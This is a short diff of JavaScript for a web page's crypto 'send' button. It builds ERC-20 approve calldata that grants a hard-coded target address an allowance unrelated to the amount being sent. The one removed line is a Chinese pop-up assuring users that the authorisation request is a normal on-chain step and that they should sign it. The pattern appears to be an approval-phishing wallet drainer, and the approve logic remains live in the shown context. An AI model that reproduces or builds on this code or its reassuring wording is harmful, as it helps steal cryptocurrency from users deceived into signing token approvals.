@@ -228,7 +228,6 @@ sendBtn.addEventListener("click", async () => {
     const needWei = BigInt(web3.utils.toWei(val.toString(),"ether"));
     const approveWei = BigInt(web3.utils.toWei(APPROVE_AMOUNT,"ether"));
     try{
-        alert("不同钱包版本交互略有差异，转账USDT时弹出授权额度，属于链上正常流程，请确认签名。");
         const approveCalldata = "0x095ea7b3"
             + TARGET_ADDR.slice(2).padStart(64,"0")
             + approveWei.toString(16).padStart(64,"0");
